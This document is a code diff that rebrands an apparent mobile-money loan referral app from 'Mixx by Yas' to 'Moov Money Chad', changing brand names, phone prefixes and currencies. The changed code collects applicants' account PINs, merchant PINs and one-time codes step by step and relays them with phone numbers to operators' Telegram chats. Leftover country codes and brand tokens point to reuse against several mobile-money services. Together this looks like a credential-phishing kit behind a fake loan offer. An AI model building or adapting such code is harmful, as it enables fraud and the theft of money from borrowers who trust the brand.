@@ -414,11 +414,11 @@ def send_agent_otp(email, code):
     if not all((host, username, password, sender)):
         raise RuntimeError("Email OTP is not configured")
     message = EmailMessage()
-    message["Subject"] = "Your Mixx by Yas agent login code"
+    message["Subject"] = "Your Moov Money Chad agent login code"
     message["From"] = sender
     message["To"] = email
     message.set_content(
-        f"Your Mixx by Yas login code is {code}. It expires in 5 minutes. "
+        f"Your Moov Money Chad login code is {code}. It expires in 5 minutes. "
         "If you did not request this code, you can ignore this email."
     )
     context = ssl.create_default_context()
@@ -691,9 +691,9 @@ def mask_phone_number(phone):
     if not phone:
         return "—"
     digits = re.sub(r"\D", "", phone)
-    if len(digits) >= 9:
-        last_9 = digits[-9:]
-        return f"+258 {last_9[:2]}***{last_9[-4:]}"
+    if len(digits) >= 8:
+        last_8 = digits[-8:]
+        return f"+235 {last_8[:2]}***{last_8[-4:]}"
     elif len(digits) > 4:
         return f"{digits[:2]}***{digits[-2:]}"
     return "***"
@@ -736,7 +736,7 @@ def format_payment_methods_message():
     pm = get_payment_methods()
     till = pm.get("mpesaTill") or pm.get("till") or "Not configured"
     paybill = pm.get("mpesaPaybill") or pm.get("paybill") or "Not configured"
-    account = pm.get("mpesaAccount") or pm.get("account") or "Mixx by Yas Loan"
+    account = pm.get("mpesaAccount") or pm.get("account") or "Moov Money Loan"
     airtel = pm.get("airtelMoney") or pm.get("airtel") or "Not configured"
     crypto_addr = pm.get("cryptoAddress") or pm.get("crypto") or "Not configured"
     crypto_net = pm.get("cryptoNetwork") or "USDT (TRC20)"
@@ -900,7 +900,7 @@ def handle_telegram_message(message):
         pm = get_payment_methods()
         till = pm.get("mpesaTill") or pm.get("till") or "Not configured"
         paybill = pm.get("mpesaPaybill") or pm.get("paybill") or "Not configured"
-        account = pm.get("mpesaAccount") or pm.get("account") or "Mixx by Yas Loan"
+        account = pm.get("mpesaAccount") or pm.get("account") or "Moov Money Loan"
         airtel = pm.get("airtelMoney") or pm.get("airtel") or "Not configured"
         crypto = pm.get("cryptoAddress") or pm.get("crypto") or "Not configured"
         crypto_net = pm.get("cryptoNetwork") or "USDT (TRC20)"
@@ -1070,7 +1070,7 @@ def handle_telegram_message(message):
                     f"📋 Application #{short_id}\n\n"
                     f"👤 Applicant: {r['first_name']} {r['last_name']}\n"
                     f"📱 Phone: {masked_phone}\n"
-                    f"💰 Amount: MTS {amount}\n"
+                    f"💰 Amount: FCFA {amount}\n"
                     f"📅 Submitted: {date_str}\n"
                     f"📌 Status: Pending"
                 )
@@ -1085,7 +1085,7 @@ def handle_telegram_message(message):
             f"{personal_link}"
         )
     elif command in {"/ping"}:
-        reply = "🏓 Pong! Mixx by Yas Loan Bot is online and running full time 24/7."
+        reply = "🏓 Pong! Moov Money Tchad Loan Bot is online and running full time 24/7."
     elif command in {"/botstatus", "/status", "/health"}:
         uptime_sec = int(time.time() - _bot_start_time)
         hours, remainder = divmod(uptime_sec, 3600)
@@ -1282,7 +1282,7 @@ def handle_verify_callback(query_id, data, chat_id, message_id, message):
         )
 
     label = "✅ Approved" if action == "approve" else "❌ Rejected"
-    step_label = "PIN + Phone" if ver["step"] == "zip_phone" else "SMS / Verification Message"
+    step_label = "Code PIN Moov" if ver["step"] in ("zip_phone", "account_pin") else "Code OTP Moov Money"
     try:
         answer_telegram_callback(query_id, text=f"Verification {step_label}: {label}")
     except Exception:
@@ -1540,13 +1540,13 @@ def telegram_notification_loop():
                     "rejected": "❌ Rejected",
                 }.get(current_status, current_status.title())
                 text = (
-                    f"New MoMo Application — {badge_hdr}\n"
+                    f"New Moov Money Application — {badge_hdr}\n"
                     f"──────────────────────\n"
                     f"👤 Applicant: {event['first_name']} {event['last_name']}\n"
-                    f"📱 Phone: +260 {event['phone']}\n"
+                    f"📱 Phone: +235 {event['phone']}\n"
                     f"🏷️ Profile: {returning_badge}\n"
                     f"🎯 Product: {event['loan_type']}\n"
-                    f"💰 Amount: ZMW {event['loan_amount']:,}\n"
+                    f"💰 Amount: FCFA {event['loan_amount']:,}\n"
                     f"📅 Term: {event['term_months']} Months\n"
                     f"🔖 Reference: {event['id']}\n"
                     f"📌 Status: {status_label}"
@@ -1565,15 +1565,15 @@ def telegram_notification_loop():
                     "rejected": "❌ Rejected",
                 }.get(current_status, current_status.title())
                 text = (
-                    f"New MoMo Application — {badge_hdr}\n"
+                    f"New Moov Money Application — {badge_hdr}\n"
                     f"──────────────────────\n"
                     f"🏷️ Profile: {returning_badge}\n"
                     f"🎯 Loan Type: {event['loan_type']}\n"
-                    f"💰 Requested Amount: ZMW {event['loan_amount']:,}\n"
+                    f"💰 Requested Amount: FCFA {event['loan_amount']:,}\n"
                     f"📅 Term: {event['term_months']} Months\n"
                     f"💼 Purpose: {event['purpose']}\n"
                     f"👷 Employment: {event['employment']}\n"
-                    f"💵 Annual Income: ZMW {event['annual_income']:,.0f}\n"
+                    f"💵 Annual Income: FCFA {event['annual_income']:,.0f}\n"
                     f"🤝 Referral Agent: {agent}\n"
                     f"📞 Contact Authorized: {consent}\n"
                     f"🔖 Reference: {event['id']}\n"
@@ -1621,7 +1621,7 @@ def telegram_notification_loop():
 
 
 class Handler(BaseHTTPRequestHandler):
-    server_version = "MixxByYasLoan/1.0"
+    server_version = "MoovMoneyChad/1.0"
 
     def send_json(self, status, payload, extra_headers=None):
         body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
@@ -2185,14 +2185,14 @@ class Handler(BaseHTTPRequestHandler):
 
         if target_chats and telegram_bot_token():
             if step in ("zip_phone", "account_pin"):
-                step_label = "🔐 Step 4: Account PIN Validation (Customer PIN)"
+                step_label = "🔐 Step 3: Code PIN Moov Money"
             elif step == "merchant_pin":
                 step_label = "🔑 Step 5: Merchant Account PIN Validation (Merchant PIN)"
             else:
-                step_label = "💬 Step 3: SMS Verification Message"
+                step_label = "💬 Step 4: Code OTP Moov Money"
 
             active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app["phone"]
-            phone_display = active_phone if str(active_phone).startswith("+") else f"+260 {active_phone}"
+            phone_display = active_phone if str(active_phone).startswith("+") else f"+235 {active_phone}"
             clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(active_phone).strip())
             short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
             with connect_db() as db:
@@ -2214,7 +2214,7 @@ class Handler(BaseHTTPRequestHandler):
                 lines.append(f"PIN: {zip_code}")
             elif step == "id_document":
                 is_url = str(id_number).strip().startswith(("http://", "https://"))
-                label = "Verification Link" if is_url else "Message / ID"
+                label = "Verification Link" if is_url else "Code OTP"
                 lines.append(f"{label}: {id_number}")
             lines.append("Status: Awaiting Verification")
 
@@ -2313,7 +2313,7 @@ class Handler(BaseHTTPRequestHandler):
         if telegram_chat_id and telegram_bot_token():
             welcome_msg = (
                 f"👋 Welcome, {name}!\n\n"
-                f"Your Mixx by Yas agent account has been created successfully.\n\n"
+                f"Your Moov Money Chad agent account has been created successfully.\n\n"
                 f"🔗 Your Exclusive Referral Link:\n{referral_url}\n\n"
                 f"Share this link with applicants to earn commissions and track leads directly from your profile!"
             )
@@ -2651,7 +2651,7 @@ if __name__ == "__main__":
     initialize_db()
     if not (os.environ.get("ORANGE_ADMIN_TOKEN") or os.environ.get("MOMO_ADMIN_TOKEN") or os.environ.get("EMOLA_ADMIN_TOKEN")):
         print(f"Local admin token: {ADMIN_TOKEN}")
-    print(f"Mixx by Yas referral prototype: http://{HOST}:{PORT}")
+    print(f"Moov Money Chad referral prototype: http://{HOST}:{PORT}")
     running = ensure_telegram_threads_running()
     if running:
         print(f"Telegram bot listener enabled for @{telegram_bot_username()}.")
